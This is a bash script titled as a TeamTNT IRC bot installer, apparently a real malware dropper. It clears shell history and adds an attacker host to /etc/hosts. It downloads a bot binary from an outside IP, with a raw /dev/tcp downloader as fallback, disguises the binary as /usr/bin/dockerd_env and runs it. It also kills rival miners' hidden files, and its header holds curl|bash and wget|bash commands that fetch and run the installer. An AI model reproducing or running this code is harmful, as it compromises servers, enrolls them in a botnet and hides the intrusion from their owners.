#!/bin/bash
#
#	TITLE:		TeamTNT-IRC-Bot-Installer
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	7.06.9
#	DATE:		08.08.2021
#
#	curl -sLk http://chimaera.cc/cmd/Setup-IRC_Bot.sh | bash
#	wget -q -O - http://chimaera.cc/cmd/Setup-IRC_Bot.sh | bash
#

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null

HTTP_BASE_URL="http://chimaera.cc"
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin
BOT_BIN_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../TNTb/$(uname -m)"

cat /etc/hosts 2>/dev/null | grep '45.9.148.108 chimaera.cc' 2>/dev/null 1>/dev/null || echo '45.9.148.108 chimaera.cc' >> /etc/hosts


function TNT_PACK_SETUP(){
BINARY=$1
APKPACK=$2
APTPACK=$3
YUMPACK=$4
if ! type $BINARY 2>/dev/null 1>/dev/null; then 
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add $APKPACK 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK --reinstall 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y $YUMPACK 2>/dev/null 1>/dev/null; yum reinstall -y $YUMPACK 2>/dev/null 1>/dev/null ; fi
fi
}

function TNT1DL(){
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

TNT_PACK_SETUP curl curl curl curl
if ! type curl 2>/dev/null 1>/dev/null; then TNT1DL $HTTP_BASE_URL/bin/curl/$(uname -m) > /usr/bin/curl;chmod 755 /usr/bin/curl; fi

########################################################################

if [ ! -f "/usr/bin/dockerd_env" ];then wget -q -O /usr/bin/dockerd_env $BOT_BIN_URL; fi	
if [ ! -f "/usr/bin/dockerd_env" ];then curl -sLk -o /usr/bin/dockerd_env $BOT_BIN_URL; fi	
if [ ! -f "/usr/bin/dockerd_env" ];then TNT1DL $BOT_BIN_URL > /usr/bin/dockerd_env; fi	

if [ -f "/usr/bin/dockerd_env" ];then	
chattr -ia /usr/bin/dockerd_env 2>/dev/null 1>/dev/null
chmod +x /usr/bin/dockerd_env 2>/dev/null 1>/dev/null
chmod 755 /usr/bin/dockerd_env 2>/dev/null 1>/dev/null
fi


CHECK_BOT_PID=$(pidof /usr/bin/dockerd_env)
if [ -z "$CHECK_BOT_PID" ]; then
chmod +x /usr/bin/dockerd_env
/usr/bin/dockerd_env
fi


chattr -ia ~/.dockerd /.dockerd ~/.configures /.configures /usr/bin/.kube /usr/sbin/.kube 2>/dev/null 1>/dev/null
rm -f ~/.dockerd /.dockerd ~/.configures /.configures /usr/bin/.kube /usr/sbin/.kube 2>/dev/null 1>/dev/null

pkill '\.dockerd' 2>/dev/null 1>/dev/null
pkill '\.kube' 2>/dev/null 1>/dev/null
pkill '\.configures' 2>/dev/null 1>/dev/null



